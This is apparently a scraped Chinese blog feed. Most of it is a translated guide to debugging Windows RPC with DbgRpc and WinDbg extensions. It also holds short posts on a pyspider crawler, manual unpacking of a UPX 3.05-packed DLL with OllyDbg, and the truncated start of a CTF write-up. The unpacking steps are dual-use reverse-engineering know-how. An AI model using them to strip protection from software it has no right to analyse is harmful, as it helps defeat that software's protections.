微软的远程过程调用（RPC）可以轻松越过进程和机器的界限并且进行数据通信。这种网络通信标准是微软Window网络通信如此强大的原因（….太绕了，翻不来，也不重要）。然而，因为RPC对进程隐藏了网络调用，所以隐藏了计算机之间的交互细节。这使得用户很难确认线程为什么这么做，正在做什么，为什么在支持的功能上失败。所以，调试和解决RPC错误非常困难。另外，大部分RPC错误的问题实际上出现在配置问题，网络连接问题，其他组件问题上。Windows有个调试工具是DbgRpc，是RPC相关的调试器扩展。这些扩展能够用来分析Windows Xp以及更新版本系统的各种RPC问题。这些Windows版本可以配置来保存RPC实时状态信息。可以保存不同数量的状态信息；这可以让你获得需要的信息，而不用防止一个重的负担在你的电脑上了（significant burden，什么东西）。细节请看Enabling RPC State Information 之后这些信息就可以被调试器或者DbgRpc访问了。在每种情况下，一个集合的查询都是可以用的。细节请看Displaying RPC State Information 在大部分情况下，你可以通过使用Common RPC Debugging Techniques.中的技术找到问题。如果你想探索一下机器是怎么保存这些细腻的，或者你想设计自己的状态信息分析的技术，可以看看RPC State Information Internals.这些工具和技术在Windows2000中不能使用 激活RPC状态信息可以收集两种不同的RPC运行时状态信息：服务端信息和完整信息。必须要在调试器或者DbgRpc使用之前激活状态信息的收集。只有Windows XP以及以后的系统可以收集RPC状态信息。收集服务端状态信息是比较轻量级。每次RPC调用大概需要100条机器指令，甚至在性能测试中都几乎不可察觉已经被加载了（…）。但是收集这些信息会耗费内存（每个RPC服务端大概4KB），所以不推荐内存有压力的机器使用。服务端信息包括数据，endpoints，线程，连接对象和服务调用对象（SCALL）。这些足够调试大部分RPC问题了。收集全部状态信息更加heavyweight。它收集了所有的信息，包括服务端信息，另外还有客户端调用对象（CCALL）。全部状态信息通常是不需要的。在电脑中运行Group Policy Editor(Gpedit.msc)可以激活收集RPC状态信息的功能。在本地电脑策略中，找到Computer Configuration/Administrative Templates/System/Remote Procedure Call。在这节下面可以看到RPC Troubleshooting State Information，当你编辑它的属性时， 1本地计算机策略-计算机配置-管理模板-系统-远程过程调用-维护RPC疑难解答状态信息（默认未启用，启用之后配置下面5中状态） 可以看到5中可能的状态：None：不维持任何状态信息。除非你电脑内存压力很大，不推荐这种配置。Server：收集服务端状态信息。推荐在个人电脑中设置这个。Full：收集全部状态信息。Auto1：在内存小于64MB的电脑中，相当于None配置。在大于64MB的电脑中相当于Server配置。Auto2：在内存小于128MB的运行Windows Server2003的电脑，或者运行Windows XP的电脑，相当于None配置。在大于128MB的Windows Server 2003中，相当于Server。这个也是默认配置。 如果你想同时配置一个局域网中的电脑的这些状态，使用Group Policy Editor卷起（roll out）机器策略到首选的机器中。策略引擎会监视你配置的策略传到首选的机器中。在这种情况下，Auto1和Auto2是特别有用的，因为不同机器的操作系统和内存大小是不一样的。如果网络中包括运行了比Windows XP更老的系统，这些电脑会忽略这些配置。 显示RPC状态信息各种各样的RPC调试扩展在Rpcexts.dll中导出。这些用来显示RPC状态信息RPC扩展只能在用户模式中运行。他们可以在CDB(或者NTSD)或者用户模式的Windbg中使用。用户模式的调试器必须有一个目标程序，但是这个目标跟RPC扩展又是没有关系的（？？）。如果调试器还没有运行，你可以简单打开它调试一个毫不相干的目标（比如windbg notepad或者cdb winmine）。接着在CDB中CTRL+C，或者Windbg中Debug|Break来停止目标进程，这样可以使用调试器的命令窗口。如果你需要分析一个远程电脑的RPC状态信息，你需要在目标电脑中运行一个用户模式的调试器，然后使用Remote Debugging。通过调试器访问RPC状态信息在一个stress环境中是特别有用的，或者当一个调试器已经运行了。 使用RPC调试扩展各种各样的RPC调试扩展在Rpcexts.dll中导出。这些用来显示RPC状态信息RPC扩展只能在用户模式中运行。他们可以在CDB(或者NTSD)或者用户模式的Windbg中使用。用户模式的调试器必须有一个目标程序，但是这个目标跟RPC扩展又是没有关系的（？？）。如果调试器还没有运行，你可以简单打开它调试一个毫不相干的目标（比如windbg notepad或者cdb winmine）。接着在CDB中CTRL+C，或者Windbg中Debug|Break来停止目标进程，这样可以使用调试器的命令窗口。如果你需要分析一个远程电脑的RPC状态信息，你需要在目标电脑中运行一个用户模式的调试器，然后使用Remote Debugging。通过调试器访问RPC状态信息在一个stress环境中是特别有用的，或者当一个调试器已经运行了。 使用DbgRpc工具DbgRpc工具（DbgRpc.exe）放在windbg安装目录中，必须使用命令提示窗口打开它。双击是不能启动这个工具的。命令提示窗口必须运行在本地电脑的administrator权限的账户下，或者域管理员权限。DbgRpc不会对系统服务产生任何调用（比如LSASS）。 这个对调试时非常有用的，只要内核还在运行，即便在系统服务已经崩溃了。 在远程电脑中使用DbgRpcDbgRpc也可以用来检查远程电脑的信息。为了让这个可以正常工作，远程电脑需要可以接受远程连接和远程认证用户。如果远程电脑的RPCSS服务已经崩溃，DbgRpc将不能工作。远程电脑中也需要Administrative或者域管理员权限。 -s参数用来指定服务端名字，-p指定传输协议。TCP和命名管道都可以使用。推荐使用TCP协议，它几乎可以在每种情况下使用。 123456G:\\&gt;dbgrpc -s MyServer -p ncacn_ip_tcp -l -P 1e8 -L 0.1Getting remote cell info ...EndpointStatus: ActiveProtocol Sequence: LRPCEndpoint name: OLE18 DbgRpc命令行可以查看详细的DbgRpc命令描述 获取RPC Cell信息详细的cell信息通过!rpcexts.getdbgcell显示，或者使用DbgRpc的-l开关。需要指定进程id已经cell number。下面的例子，进程id是0x278，cell number是0000.0002 12345678D:\\wmsg&gt;dbgrpc -l -P 278 -L 0.2Getting cell info ...ThreadStatus: DispatchedThread ID: 0x1A4 (420)Last update time (in seconds since boot):470.25 (0x1D6.19)For details on the optional parameters, see DbgRpc Command-Line Options.For a similar example using the RPC debugger extensions, see !rpcexts.getdbgcell. 获取RPC Endpoint信息Endpoint信息通过!rpcexts.getendpointinfo显示，或者DbgRpc的-e开关。如果指定了endpoint number，就会显示它的信息。如果忽略endpoint number，系统中所有进程的endpoint都会显示。下面是显示所有endpoints的例子，通常包含进程id和cell number作为额外的参数是很有用的方式。 12345678910111213141516171819202122232425262728293031323334353637383940D:\\wmsg&gt;dbgrpc -eSearching for endpoint info ...PID CELL ID ST PROTSEQ ENDPOINT-------------------------------------------------------00a8 0000.0001 01 NMP \\PIPE\\InitShutdown00a8 0000.0003 01 NMP \\PIPE\\SfcApi00a8 0000.0004 01 NMP \\PIPE\\ProfMapApi00a8 0000.0007 01 NMP \\pipe\\winlogonrpc00a8 0000.0008 01 LRPC OLE500c4 0000.0001 01 LRPC ntsvcs00c4 0000.0003 01 NMP \\PIPE\\ntsvcs00c4 0000.0008 01 NMP \\PIPE\\scerpc00d0 0000.0001 01 NMP \\PIPE\\lsass00d0 0000.0004 01 NMP \\pipe\\WMIEP_d000d0 0000.000b 01 NMP \\PIPE\\POLICYAGENT00d0 0000.000c 01 LRPC policyagent0170 0000.0001 01 LRPC epmapper0170 0000.0003 01 TCP 1350170 0000.0005 01 SPX 342800170 0000.0006 01 NB 1350170 0000.0007 01 NB 1350170 0000.000b 01 NMP \\pipe\\epmapper01b8 0000.0001 01 NMP \\pipe\\spoolss01b8 0000.0003 01 LRPC spoolss01b8 0000.0007 01 LRPC OLE700ec 0000.0001 01 LRPC OLE200ec 0000.0003 01 LRPC senssvc00ec 0000.0007 01 NMP \\pipe\\tapsrv00ec 0000.0008 01 LRPC tapsrvlpc00ec 0000.000c 01 NMP \\PIPE\\ROUTER00ec 0000.0010 01 NMP \\pipe\\WMIEP_ec0214 0000.0001 01 NMP \\PIPE\\winreg022c 0000.0001 01 LRPC LRPC0000022c.00000001022c 0000.0003 01 TCP 1058022c 0000.0005 01 SPX 24576022c 0000.0006 01 NMP \\PIPE\\atsvc02a8 0000.0001 01 LRPC OLE30370 0000.0001 01 LRPC OLE90278 0000.0001 01 TCP 1120030c 0000.0001 01 LRPC OLE12 For details on the optional parameters, see DbgRpc Command-Line Options.For a similar example using the RPC debugger extensions, see !rpcexts.getendpointinfo. 获取RPC线程信息使用显示!rpcexts.getthreadinfo线程信息，或者DbgRpc的-t开关。必须指定进程pid。也可以指定线程ID，如果忽略，显示进程的所有线程。例子，进程ID 0x278，忽略了线程ID 12345678D:\\wmsg&gt;dbgrpc -t -P 278Searching for thread info ...PID CELL ID ST TID LASTTIME-----------------------------------0278 0000.0002 01 000001a4 00072c090278 0000.0005 03 0000031c 00072bf5For details on the optional parameters, see DbgRpc Command-Line Options.For a similar example using the RPC debugger extensions, see !rpcexts.getthreadinfo. 获取RPC调用信息服务端调用信息通过!rpcexts.getcallinfo显示，DbgRpc的-c开关有4个可选的参数。其中三个CallID，IfStart，ProcNum是用来跟中RPC调用来标记信息的。第四个参数是ProcessID是服务端的Pid。你可以使用你知道的参数值来缩小搜索。如果没有参数指定，系统中所有可知的SCALLs都会显示。例子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748D:\\wmsg&gt;dbgrpc -cSearching for call info ...PID CELL ID ST PNO IFSTART TIDNUMBER CALLFLAG CALLID LASTTIME CONN/CLN----------------------------------------------------------------------------00c4 0000.0002 00 00f 82273fdc 0000.0007 00000001 00000002 0003595d 0000.001000c4 0000.0006 00 009 367abb81 0000.0015 00000001 0000004d 000185bd 0000.000500c4 0000.000a 00 007 367abb81 0000.002d 00000001 0000009f 00014672 0000.000900c4 0000.000c 00 007 367abb81 0000.002d 00000001 00000083 000122e3 0000.000b00c4 0000.000d 00 03b 8d9f4e40 0000.002d 00000001 000000f7 0001aba5 0000.002000c4 0000.000e 00 03b 8d9f4e40 0000.0026 00000001 00000002 00023056 0000.002100c4 0000.000f 00 008 82273fdc 0000.001e 00000009 baadf00d 000366b4 00ec.03bc00c4 0000.0012 00 00d 8d9f4e40 0000.0004 00000001 00000051 0000a334 0000.001100c4 0000.0014 00 000 367abb81 0000.0015 00000001 0000004c 0002db53 0000.001300c4 0000.0017 00 007 367abb81 0000.0015 00000001 00000006 0000d102 0000.001600c4 0000.0019 00 007 367abb81 0000.0004 00000001 00000006 0000f09e 0000.001800c4 0000.001b 00 009 65a93890 0000.0007 00000001 0000012e 00630f65 0000.001a00c4 0000.001e 00 026 8d9f4e40 0000.0015 00000001 0000037d 0005e579 0000.002c00c4 0000.001f 00 008 82273fdc 0000.0033 00000009 baadf00d 000145b3 00c4.02f800c4 0000.0023 00 000 367abb81 0000.0004 00000001 0000007e 000372f3 0000.002200c4 0000.0025 00 03b 8d9f4e40 0000.0026 00000001 0000000b 000122e3 0000.002400c4 0000.0027 00 000 367abb81 0000.002d 00000001 0000000b 00012e27 0000.002800c4 0000.002a 00 008 82273fdc 0000.0033 00000009 baadf00d 0001245f 022c.029000c4 0000.002f 00 007 367abb81 0000.0026 00000001 0000000a 0002983c 0000.002e00c4 0000.0031 00 004 3ba0ffc0 0000.0026 00000001 00000007 0005c439 0000.001c00c4 0000.0032 00 00b 82273fdc 0000.0039 00000009 baadf00d 00687db6 00d0.01d400c4 0000.0036 00 007 367abb81 0000.0030 00000001 00000065 0003a5e1 0000.003500c4 0000.0037 00 00d 8d9f4e40 0000.0015 00000001 0000033f 000376fa 0000.002b00c4 0000.0038 00 008 8d9f4e40 0000.0015 00000001 00000803 0018485c 0000.003b00c4 0000.003c 00 00b 82273fdc 0000.0034 00000009 baadf00d 0001f956 00a8.024400c4 0000.003d 00 008 82273fdc 0000.0034 00000009 baadf00d 0001ff02 01b8.037c0170 0000.0009 00 002 e60c73e6 0000.0013 00000009 baadf00d 0005a371 00ec.031c0170 0000.000a 00 002 0b0a6584 0000.0002 00000009 baadf00d 000126ae 00c4.01300170 0000.000c 00 002 0b0a6584 0000.0010 00000009 baadf00d 00012bc4 022c.02900170 0000.000d 00 003 00000136 0000.001b 00000009 baadf00d 0005ba71 00ec.03100170 0000.000e 00 000 412f241e 0000.0002 00000009 baadf00d 00012f21 02a8.029c0170 0000.0010 00 003 00000136 0000.0013 00000009 00000003 000341da 0370.00600170 0000.0011 00 006 e60c73e6 0000.001b 00000009 baadf00d 000f1d00 0370.03280170 0000.0017 00 002 0b0a6584 0000.001b 00000009 baadf00d 0006c803 0278.01840170 0000.001a 00 004 00000136 0000.0012 00000001 baadf00d 00038e9b 00ec.034800ec 0000.0006 00 009 00000134 0000.0011 00000009 baadf00d 000b233f 0170.024400ec 0000.000b 00 001 2f5f6520 0000.001c 00000009 baadf00d 00035510 00ec.033400ec 0000.000e 00 001 629b9f66 0000.0014 00000009 baadf00d 00035813 00ec.01c400ec 0000.0012 00 000 629b9f66 0000.0014 00000009 baadf00d 00026cc6 00a8.016400ec 0000.001b 00 001 2f5f6520 0000.0004 00000001 baadf00d 000352c1 00ec.03a802a8 0000.0004 00 009 00000134 0000.0002 00000009 baadf00d 0009a540 0170.02440370 0000.0006 00 003 00000134 0000.0005 0000000b baadf00d 0002e7cd 00ec.03500370 0000.0008 00 009 00000134 0000.0007 0000000b 01cee9e4 000838fa 0170.02440278 0000.0004 02 000 19bb5061 0000.0002 00000001 00000001 00072c09 0000.0003 For details on the optional parameters, see DbgRpc Command-Line Options.For a similar example using the RPC debugger extensions, see !rpcexts.getcallinfo. 获取RPC客户端调用信息使用!rpcexts.getclientcallinfo获取客户端调用信息，或者DbgRpc的-a开关。也有四个参数可选。其中三个CallID，IfStart，ProcNum是用来跟中RPC调用来标记信息的。第四个参数ProcessID是属于这个调用的进程的Pid。你可以使用你知道的参数值来缩小搜索。如果没有参数指定，系统中所有可知的CCALLs都会显示。例子： 12345D:\\wmsg&gt;dbgrpc -aSearching for call info ...PID CELL ID PNO IFSTART TIDNUMBER CALLID LASTTIME PS CLTNUMBER ENDPOINT------------------------------------------------------------------------------0390 0000.0001 0000 19bb5061 0000.0000 00000001 00072bff 07 0000.0002 1120 For details on the optional parameters, see DbgRpc Command-Line Options.For a similar example using the RPC debugger extensions, see !rpcexts.getclientcallinfo. 注意：只有在全部状态信息都收集的时候，才有CCALLS的信息。 常用的RPC调试技术下面将介绍4中常见的RPC问题。RPC状态信息可以用来检查这些问题。DbgRpc和RPC调试扩展命令都可以使用。 分析一个Stuck（卡）调用问题当一个进程直接或间接的进行一次RPC调用时，等待（holding）一个critical section或者资源时通过会出现这个问题。在这种情况下，RPC调用会到另一个进程或者机器，然后派遣到管理接口（服务接口）中，这个会等待很久。这导致调用方会出现等待超时。 当通过调试器检查时，RPC是这个等待线程的最高层，但是不清楚究竟在等待什么。下面是一个这种堆栈的例子，有很多可能性。 1234567891011121314151617180:002&gt; ~1kChildEBP RetAddr0068fba0 77e9e8eb ntdll!ZwWaitForSingleObject+0xb0068fbc8 4efeff73 KERNEL32!WaitForSingleObjectEx+0x5a0068fbe8 4eff0012 RPCRT4!UTIL_WaitForSyncIO+0x210068fc0c 4efe6e2b RPCRT4!UTIL_GetOverlappedResultEx+0x440068fc44 4ef973bf RPCRT4!WS_SyncRecv+0x12a0068fc68 4ef98d5a RPCRT4!OSF_CCONNECTION__TransSendReceive+0xcb0068fce4 4ef9b682 RPCRT4!OSF_CCONNECTION__SendFragment+0x2970068fd38 4ef9a5a8 RPCRT4!OSF_CCALL__SendNextFragment+0x2720068fd88 4ef9a9cb RPCRT4!OSF_CCALL__FastSendReceive+0x1650068fda8 4ef9a7f8 RPCRT4!OSF_CCALL__SendReceiveHelper+0xed0068fdd4 4ef946a7 RPCRT4!OSF_CCALL__SendReceive+0x370068fdf0 4efd56b3 RPCRT4!I_RpcSendReceive+0xc40068fe08 01002850 RPCRT4!NdrSendReceive+0x4f0068ff40 01001f32 rtclnt+0x28500068ffb4 77e92ca8 rtclnt+0x1f320068ffec 00000000 KERNEL32!CreateFileA+0x11b 下面是怎么检查这个问题。Troubleshooting a stuck call problem 1- 保证调试器正在调试有这个stuck cell的进程。（是那个可能在等待RPC的线程所属的进程）2- 或者线程的堆栈指针。堆栈就像上面例子中显示的那样，这个例子的堆栈指针是0x0068FBA03- 获取这个线程的调用信息。通过!rpcexts.rpcreadstack加上堆栈指针作为参数来获取。 12345670:001&gt; !rpcexts.rpcreadstack 68fba0CallID: 1IfStart: 19bb5061ProcNum: 0Protocol Sequence: &quot;ncacn_ip_tcp&quot; (Address: 00692ED8)NetworkAddress: &quot;&quot; (Address: 00692F38)Endpoint: &quot;1120&quot; (Address: 00693988) 显示的这些信息可以让你跟踪这个调用。 4- 网络地址是空的，标明是本地机器。Endpoint是1120。需要确认哪个进程拥有这个endpoint。通过!rpcexts.getendpointinfo加上endpoint作为参数来获取 //应该是客户端 123450:001&gt; !rpcexts.getendpointinfo 1120Searching for endpoint info ...PID CELL ID ST PROTSEQ ENDPOINT--------------------------------------------0278 0000.0001 01 TCP 1120 5- 根据前面的信息，可以看到进程0x278拥有这个endpoint，可以通过!rpcexts.getcallinfo获取到这个call的所有信息，需要加上四个参数CallID, IfStart, and ProcNum（3步骤已经知道）和进程pid 0x278 123450:001&gt; !rpcexts.getcallinfo 1 19bb5061 0 278Searching for call info ...PID CELL ID ST PNO IFSTART TIDNUMBER CALLFLAG CALLID LASTTIME CONN/CLN----------------------------------------------------------------------------0278 0000.0004 02 000 19bb5061 0000.0002 00000001 00000001 00072c09 0000.0003 6- 第5步的信息非常有用，但是有些信息太少了。第二列给出的cell id是0000.0004。如果!rpcexts.getdbgcell加上这个cell id，可以显示更易读的cell信息： 12345678910110:001&gt; !rpcexts.getdbgcell 278 0.4Getting cell info ...CallStatus: DispatchedProcedure Number: 0Interface UUID start (first DWORD only): 19BB5061Call ID: 0x1 (1)Servicing thread identifier: 0x0.2Call Flags: cachedLast update time (in seconds since boot):470.25 (0x1D6.19)Owning connection identifier: 0x0.3 信息显示这个调用已经”dispatched”，表示已经离开了RPC运行时。最后更新时间是470.25，通过!rpcexts.rpctime可以看到现在的时间。 120:001&gt; !rpcexts.rpctimeCurrent time is: 6003, 422 表示这次call的最后联系在5533秒之前了，接近92分钟，因此这个肯定是一个stuck call。 7- 在挂载到服务端进程之前，你可以使用Servicing thread identifier找到当前处理这个call的线程信息。也就是另一个cell number，第6步中的0x0.2，可以像下面一样使用： 1234560:001&gt; !rpcexts.getdbgcell 278 0.2Getting cell info ...ThreadStatus: DispatchedThread ID: 0x1A4 (420)Last update time (in seconds since boot):470.25 (0x1D6.19) 现在你知道你要找的是0x278进程的0x1A4线程。 可能这个线程已经在做其他的RPC调用了，你又必要重复这个过程跟踪这个call。 ##跟踪服务端进程的Contention（争用） 为了能够处理发来的请求，RPC报了一个工作线程集合。理论上这个线程数量很小。然后理想的情况只存在实验室环境下，这些服务管理函数非常小心和谐（。。。）。在真实情况下，线程的数量决定于服务端的工作量，不过不管怎么样都在1-50的范围内。如果工作线程数量超过了50，可能服务端进程有过多的竞争。通过引起这个的是heap的胡乱使用，内存的压力，或者服务端大部分的活动都通过一个单独的临界区。使用!rpcexts.getthreadinfo获取服务进程的线程数量，或者DbgRpc的-t选项。需要指定进程ID，如下面的0xC4 1234567891011D:\\wmsg&gt;dbgrpc -t -P c4Searching for thread info ...PID CELL ID ST TID LASTTIME-----------------------------------00c4 0000.0004 03 0000011c 000f164f00c4 0000.0007 03 00000120 008a629000c4 0000.0015 03 0000018c 008a623600c4 0000.0026 03 00000264 0005c44300c4 0000.002d 03 00000268 000265bb00c4 0000.0030 03 0000026c 000f1d3200c4 0000.0034 03 00000388 007251e9 在这个例子中，只有7个工作线程，是合理的。如果有超过100个线程，就需要加载调试器看看问题了。Note Running queries such as dbgrpc -t remotely is expensive to the server and the network. If you use this query in a script, you should make sure this command is not run too often. 检查Struct的线程RPC需要它的工作线程来完成正常的工作，通常有个问题，在同一个进程中的组件会因为等待一个公共的临界区死锁（比如，loader lock或者heap lock）。这将导致很多线程暂停，很有可能也有RPC工作线程。如果出现了这种情况，RPC服务器不会再给外界响应。RPC调用将返回RPC_S_SERVER_UNAVAILABLE或者RPC_S_SERVER_TOO_BUSY 一个很小的问题可能会硬气有问题的驱动阻止IRPs完成，到达RPC服务器。如果你怀疑可能出现了这个问题，使用DbgRpc –t或者!rpcexts.getthreadinfo需要进程PID作为参数。下面的列子是0xC4: 1234567891011D:\\wmsg&gt;dbgrpc -t -P c4Searching for thread info ...PID CELL ID ST TID LASTTIME-----------------------------------00c4 0000.0004 03 0000011c 000f164f00c4 0000.0007 03 00000120 008a629000c4 0000.0015 03 0000018c 008a623600c4 0000.0026 03 00000264 0005c44300c4 0000.002d 03 00000268 000265bb00c4 0000.0030 03 0000026c 000f1d3200c4 0000.0034 03 00000388 007251e9 TID那一列给出了每个线程的ID。LATSTIME列包含每个线程最近状态改变的时间戳。只要服务器收到一个请求，至少有一个线程会改变状态，时间戳就会更新。因此，一个RPC请求失败了，但是没有任何一个线程的时间戳改变，表示这个请求没有到达RPC运行时中。你需要在研究是什么引起的。 在服务端标明调用者有些时候需要确认谁发送的RPC请求，虽然你只有这次调用的服务线程信息。这个非常有用-比如，找到谁传递了不合法的参数给RPC调用。根据某些特别依赖于协议序列的调用，你可以或者不同程度的细节，而有些协议根本没有这些信息（比如NetBiso） Identifying the caller from the server thread1- 打开用户模式调试器，挂载到目标服务线程中2- 通过|命令获取到进程id 120:001&gt; |0 id: 3d4 name: rtsvr.exe 3- !rpcexts.getcallinfo获取到进程中存在的calls。需要指定进程ID 0x3D4 123450:001&gt; !rpcexts.getcallinfo 0 0 FFFF 3d4Searching for call info ...PID CELL ID ST PNO IFSTART THRDCELL CALLFLAG CALLID LASTTIME CONN/CLN----------------------------------------------------------------------------03d4 0000.0004 02 000 19bb5061 0000.0002 00000001 00000001 00a1aced 0000.0003 查找状态时2或1（dispatched或active）的调用。在这个例子中，只有一个call，如果有更多的，你可以使用!rpcexts.getdbgcell加上cell number（THRDCELL列）来获取线程IDs，从而你可以决定哪个是你感兴趣的调用了 4- 在知道你感兴趣的call之后，看看CONN/CLN所在的cell number，这个是连接对象的cell ID。这里是0000.0003。使用!rpcexts.getdbgcell加上这个id 1234567891011120:001&gt; !rpcexts.getdbgcell 3d4 0.3Getting cell info ...ConnectionConnection flags: ExclusiveAuthentication Level: DefaultAuthentication Service: NoneLast Transmit Fragment Size: 24 (0x6F56D)Endpoint for the connection: 0x0.1Last send time (in seconds since boot):10595.565 (0x2963.235)Last receive time (in seconds since boot):10595.565 (0x2963.235)Getting endpoint info ...Process object for caller is 0xFF9DF5F0 这个命令显示了这个连接的客户端的所有信息。实际的信息会有很多不同，跟使用的transport有关系。在这个例子中，使用的本地命令管道通信，调用者的进程对象地址也显示了。如果你挂载了内核调试器（或者启动一个本地调试器），你可以使用!process看到看看这个地址的信息。如果使用LRPC通信，会显示进程ID和线程ID。如果使用TCP通信，会显示调用者的IP地址。如果使用了远程命名管道，不会显示任何信息。 转载请注明出处，谢谢！","tags":[{"name":"Windbg调试","slug":"Windbg调试","permalink":"https://anhkgg.github.io/tags/Windbg调试/"},{"name":"RPC","slug":"RPC","permalink":"https://anhkgg.github.io/tags/RPC/"},{"name":"远程过程调用","slug":"远程过程调用","permalink":"https://anhkgg.github.io/tags/远程过程调用/"}]},{"title":"linux pyspider learning","date":"2015-01-24T10:54:17.000Z","path":"linux-pyspider-learning/","text":"1. 创建工程运行pyspider，然后浏览器中输入localhost:5000，即可进入project管理，Create创建新的project 2. 编码1234567891011121314151617181920212223242526272829303132from pyspider.libs.base_handler import * import re class Handler(BaseHandler): crawl_config = &#123; &#125; @every(minutes=24 * 60) def on_start(self): for i in range(1, 287): self.crawl(&apos;http://xxx?ajax=1&amp;major=73&amp;showMore=0&amp;refer=cindex&amp;page=&apos;+str(i)+&apos;&amp;_CSRFToken=&apos;, callback=self.index_page) @config(age=10 * 24 * 60 * 60) def index_page(self, response): #print response.json[&apos;data&apos;] total = response.json[&apos;data&apos;][&apos;total&apos;] lists = response.json[&apos;data&apos;][&apos;lists&apos;] #print total, len(lists) for i in range(0, len(lists)): url = lists[i][&apos;url&apos;]; #if re.match(&quot;http://xxx?/corp/\\d+/project/\\d+&quot;, url): self.crawl(url, callback=self.detail_page) def detail_page(self, response): #信息过滤提取content = response.doc(&apos;div.position-content&apos;).text() if content == &quot;&quot; or content == None: content = response.doc(&apos;div.project-info &gt; div.pro-detail&apos;).text() return &#123; &quot;url&quot;: response.url, &quot;title&quot;: response.doc(&apos;title&apos;).text(), &quot;content&quot;: content &#125; self.crawl(url, callback)抓取网页，callback为响应函数def callback(self, response),response表示内容，可以通过response.doc(‘各类选择器’).text()获取到需要的内容更多response的操作可以查看pyspider response 注意：由于 response.doc是一个pyquery对象，信息过滤中可以使用css选择器pyspider自带css选择器生成，但是貌似不能使用在浏览器中f12，也可以自动生成选择器在生成的选择其中，如&lt;#pagecontent &gt; table:nth-child(3) &gt; tbody &gt; tr:nth-child(2) &gt; td:nth-child(2) &gt; table &gt; tbody &gt; tr &gt; td &gt; div:nth-child(2)&gt;需要去掉其中的tbody标签，否则无法使用，是否还有其他标签，没有过多测试其实css选择器不用从上到下完整的生成，只要能够唯一获取指定的元素即可 3. 调试第一次run，调用on_start，crawl指定的url，然后调用callback函数，界面显示如图 切换到follow窗口，可以看到符合callback函数的url列表 点击列表中右侧播放按钮，crawl该页面，获取符合规则的url，调用下一个callback 然后继续播放按钮，可能就是需要页面内容过滤了，根据自己的需求进行过滤return返回的内容会写入数据库 4. 调试好之后，run然后就可以在results页面看到爬取结果了。","tags":[{"name":"pyspider","slug":"pyspider","permalink":"https://anhkgg.github.io/tags/pyspider/"}]},{"title":"upx3.05手脱笔记","date":"2015-01-07T06:57:42.000Z","path":"upx3-05手脱笔记/","text":"本来一直对upx3.0以后加密壳挺畏惧的，其逻辑看起来挺简单的，有想逆一把的想法，但是都没实施，今天又遇到了，没法，太急，去google了一下，找到几篇资料但是年代都挺久远的，看到[1]中直接esp定律就脱了，有点不信，就试了试，靠，居然可以，只能表示，实践是检验真理的唯一标准。 #1. 查壳[!] UPX 3.05 compressed !查出来是3.05，也不知道是不是误报，比[1]中版本高了点，所以也就是尝试尝试esp定律拖一下 #2. 脱壳OD加载（是个dll，通过load.exe加载），在DllMain断下，看到熟悉的pushad，感觉方法可能靠谱了1234103432E0 &gt; 807C24 08 01 cmp byte ptr ss:[esp+0x8],0x1103432E5 0F85 9D0B0000 jnz xxx.10343E88103432EB 60 pushad103432EC BE 00C02C10 mov esi,xxx.102CC000 f8到103432EC ，在数据窗口显示esp值，然后右键下了个硬件访问断点（其实以前尝试过，但是下的是内存访问断点，失败了，也不知道是不是这个原因，待会儿试试）。接着F9，断在了下面的代码中，看不出啥，就有个 jmp xxx.100C3C71，地址离当前地址还算较远，可能是另一个节12345610343E7B 8D4424 80 lea eax,dword ptr ss:[esp-0x80] //这个就是先前pushad压入的吗？？10343E7F 6A 00 push 0x010343E81 39C4 cmp esp,eax10343E83 ^ 75 FA jnz short xxx.10343E7F //循环了多次，F4直接到10343E85 ，应该是在清理堆栈吧？？ 10343E85 83EC 80 sub esp,-0x8010343E88 - E9 E4FDD7FF jmp xxx.100C3C71 12100C3C71 /E9 CA371100 jmp xxx.101D7440100C3C76 |E9 15311700 jmp xxx.10236D90 ; jmp 到 kernel32.UnlockFile 单步到jmp，F8跟到其代码中，看到了熟悉的一段入口代码：12345678910111213141516101D7440 8BFF mov edi,edi101D7442 55 push ebp101D7443 8BEC mov ebp,esp101D7445 837D 0C 01 cmp dword ptr ss:[ebp+0xC],0x1101D7449 75 05 jnz short xxx.101D7450101D744B E8 32DFEEFF call xxx.100C5382101D7450 8B45 10 mov eax,dword ptr ss:[ebp+0x10]101D7453 50 push eax101D7454 8B4D 0C mov ecx,dword ptr ss:[ebp+0xC]101D7457 51 push ecx101D7458 8B55 08 mov edx,dword ptr ss:[ebp+0x8]101D745B 52 push edx101D745C E8 1F000000 call xxx.101D7480101D7461 83C4 0C add esp,0xC101D7464 5D pop ebp101D7465 C2 0C00 retn 0xC 通过堆栈参数，进一步确认了下，这是DllMain函数12340006F880 7C92118A 返回到 ntdll.7C92118A0006F884 10000000 xxx.100000000006F888 000000010006F88C 00000000 然后在101D7440地址，尝试dump，成功之后在检测壳信息[CompilerDetect] -&gt; Visual C++ 9.0 (Visual Studio 2008)应该是脱壳成功了，但是iat没有修复，先ida看看是否需要修复 #3. 修复如果需要修复，使用importRec工具找到进程，选择目标dll，然后填入OEP，修复即可 #4. 参考 [1]: http://bbs.pediy.com/showthread.php?t=44125 【原创】手脱 UPX3.0[2]: http://bbs.pediy.com/showthread.php?t=140312 【原创】UPX3.03脱壳机-学习版[代码更新]","tags":[{"name":"upx","slug":"upx","permalink":"https://anhkgg.github.io/tags/upx/"},{"name":"unpack","slug":"unpack","permalink":"https://anhkgg.github.io/tags/unpack/"}]},{"title":"xctf sctf summary, little writeup","date":"2014-12-07T13:02:23.000Z","path":"sctf-summary/","text":"1. Misc10xctf优良传统，百度之手持两把锟斤拷，口中疾呼烫烫烫脚踏千朵屯屯屯，笑看万物锘锘锘其实我没提交，队友提交的，应该是这个 2. Re50听说逆向都挺难的，这里有个简单的，快来秒~~~ :D 逆向题把我们逼疯了，才弄个这个出来，秀优越吗？队友做的，看了一下，很简单12345678k = &quot;Jr3gFud6n&quot;flag = &quot;&quot;for i in range(0, len(k)): a = ord(k[i])-3 flag += chr(a)print flag#应该是这个SCTF&#123;Go0dCra3k&#125; 3. Misc100简单的贪吃蛇，吃到30分它就告诉你flag！但是要怎么控制它呢? 妹的，确定是100的，搞了老半天，还是linux的，upx加壳，首先就乱了好吧，过了不知道多久，回过神来，upx脱壳，ida加载分析，大致弄清楚流程，代码用到了几个关键函数：12move移动光标printw显示字符 然后就是位置比较，成功了30次之后，就会显示出flag，可是代码中没有啊，习惯了可以f5就f5，所以，乱了很久回到汇编窗口，通过printw找到几处打印，提取字符，通过python打印了一下，妹的乱码，有什么编码问题，不懂：12345678flag = [0x7F, 0x1A, 0x64, 0x7F, 0x78, 0x44, 0x5E, 0x50, 0x67, 0x7d, 0x4E, 0x5F, 0x2A, 0x64, 0x6D, 0x52, 0x4C, 